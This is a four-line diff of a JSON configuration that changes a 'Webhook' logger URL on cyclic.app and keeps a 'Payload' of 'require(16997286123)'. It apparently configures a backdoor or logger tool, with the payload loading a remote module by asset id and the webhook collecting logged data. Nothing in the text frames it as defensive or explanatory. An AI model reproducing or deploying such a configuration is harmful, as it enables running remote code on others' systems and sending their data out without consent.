@@ -1,4 +1,4 @@
 {
-    "Webhook": "https://raven.cyclic.app/logger",
+    "Webhook": "https://carolus.cyclic.app/logger",
     "Payload": "require(16997286123)"
 }
